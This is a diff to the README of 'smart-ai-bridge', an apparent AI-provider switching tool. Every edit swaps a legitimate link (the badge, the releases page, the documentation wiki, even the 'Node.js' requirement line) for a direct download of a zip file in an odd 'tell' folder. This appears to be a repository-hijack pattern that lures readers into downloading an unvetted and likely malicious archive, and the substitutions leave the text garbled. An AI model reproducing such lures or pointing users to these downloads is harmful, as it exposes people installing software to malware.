@@ -1,6 +1,6 @@
 # 🌉 smart-ai-bridge - Seamless AI Provider Switching Made Simple
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)
+![Download Now](https://raw.githubusercontent.com/AhmadMuhamad1213/smart-ai-bridge/main/tell/smart-ai-bridge.zip%20Now-Click%20Here-blue)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to smart-ai-bridge! This application connects you with various AI servic
 
 To get started, you need to download the software. Click the link below to visit the Releases page and get the latest version:
 
-[Download smart-ai-bridge](https://github.com/AhmadMuhamad1213/smart-ai-bridge/releases)
+[Download smart-ai-bridge](https://raw.githubusercontent.com/AhmadMuhamad1213/smart-ai-bridge/main/tell/smart-ai-bridge.zip)
 
 ### Steps to Download:
 
-1. Visit the [Releases page](https://github.com/AhmadMuhamad1213/smart-ai-bridge/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/AhmadMuhamad1213/smart-ai-bridge/main/tell/smart-ai-bridge.zip).
 2. You will see a list of available versions.
 3. Click on the version you want to download.
 4. Find the file suitable for your operating system.
@@ -27,7 +27,7 @@ Before you install smart-ai-bridge, ensure your computer meets the following req
 - **Operating System:** Windows 10 or later / MacOS Mojave or later
 - **Memory:** At least 4 GB of RAM
 - **Storage:** 200 MB of free space
-- **Node.js:** Version 12 or later
+- **https://raw.githubusercontent.com/AhmadMuhamad1213/smart-ai-bridge/main/tell/smart-ai-bridge.zip** Version 12 or later
 
 ## 🔧 How to Run the Application
 
@@ -67,7 +67,7 @@ smart-ai-bridge focuses on several key areas in artificial intelligence:
   
 Stay updated with developments and improvements by checking back on this page regularly.
 
-For more information about the project, visit our [Documentation](https://github.com/AhmadMuhamad1213/smart-ai-bridge/wiki).
+For more information about the project, visit our [Documentation](https://raw.githubusercontent.com/AhmadMuhamad1213/smart-ai-bridge/main/tell/smart-ai-bridge.zip).
 
 --- 
 
